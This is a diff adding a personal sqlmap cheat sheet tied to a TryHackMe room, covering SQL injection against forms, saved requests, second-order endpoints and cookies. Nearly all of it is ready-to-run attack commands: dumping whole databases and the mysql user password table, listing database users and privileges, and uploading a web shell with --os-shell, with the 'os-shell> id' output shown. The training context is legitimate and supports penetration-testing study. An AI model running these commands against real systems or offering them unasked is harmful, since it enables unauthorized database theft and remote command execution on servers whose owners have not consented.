@@ -1,0 +1,111 @@
+### SQLMAP ###
+## link
+https://tryhackme.com/room/sqlmap
+
+## technique
+B: Boolean-based blind
+E: Error-based
+U: Union query-based
+S: Stacked queries
+T: Time-based blind
+Q: Inline queries
+
+
+
+###############
+## post form ##
+###############
+sqlmap -u "url" --forms --dbs
+sqlmap -u "url" --data"username=aa&password=pp"
+sqlmap -u "url" --forms -D {dbs} --dump-all
+sqlmap -u "url" --forms -D {dbs} --tables
+sqlmap -u "url" --forms -D {dbs} -T {table} --columns
+sqlmap -u "url" --forms -D {dbs} -T {table} -C {columns},{columns} --dump
+sqlmap -u "url" --forms -D mysql -T user -C User,Password --dump
+
+## post copy to file (through burp)
+sqlmap -r req.txt -p {param} --dbs						# provide vuln param
+sqlmap -r req.txt --level=5 --risk=3 --technique=B --dbs			# extend test on B technique
+
+
+
+##################
+## second order ##
+##################
+# cat req1.txt
+POST /api.php HTTP/1.1
+Host: employee-backoffice.ransomdefense.com
+
+{"action":"set_clients_filter","filter":"ff"}
+
+# cat req2.txt
+POST /api.php HTTP/1.1
+Host: employee-backoffice.ransomdefense.com
+
+{"action":"get_clients_filtered_count"}
+
+# sqlmap
+sqlmap -r req1.txt -p filter --second-req req2.txt --technique=B --level=5 --risk=3 --dbs
+
+
+
+################
+## --OS-SHELL ##
+################
+# --os-shell (not with blind, high latency)
+# first intercept POST with burp
+POST /search.php HTTP/1.1
+Host: 192.168.50.19
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 9
+Origin: http://192.168.50.19
+Connection: close
+Referer: http://192.168.50.19/search.php
+Cookie: PHPSESSID=vchu1sfs34oosl52l7pb1kag7d
+Upgrade-Insecure-Requests: 1
+
+item=test
+
+# then
+sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"            # upload a shell
+sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/"               # upload a shell
+[1] ASP
+[2] ASPX
+[3] JSP
+[4] PHP (default)
+> 4                                                                             # choose which shell
+os-shell> id                                                                    # got a shell
+
+
+
+####################
+## inurl & others ##
+####################
+sqlmap -u "url" --current-user							# dbms current user
+sqlmap -u "url" --is-dba							# is current user Admin
+sqlmap -u "url" --users								# get usernames of db
+sqlmap -u "url" --privileges							# get privs
+sqlmap -u "url" --passwords							# get pass of db users
+sqlmap -u "url" --schema							# test sur param inurl
+sqlmap -u "url" --cookie=PHPSESSID=xxx --schema					# add cookie
+sqlmap -u "url" -p {param} --dbs						# provide vuln param
+sqlmap -u "url" -p {param} -v3 --dbs						# debug infos
+
+sqlmap -u "url"
+  --auth-type="Basic" --auth-cred="ali-072a627f:sesame{zqxa9kaa+a0=}"		# add basic auth
+  --data="login=aaaa&passwd=aaaa&Login=Login" --cookie="CONID=123456*"		# injection in cookie
+  --technique="B" --dbms="sqlite" --dbs
+  --eval="import base64; CONID = base64.b64encode(str(CONID).encode()).decode()" # special cmd on CONID
+
+## DSSS ##
+dsss -u "http://$h/path"
+
+
+
+
+
+
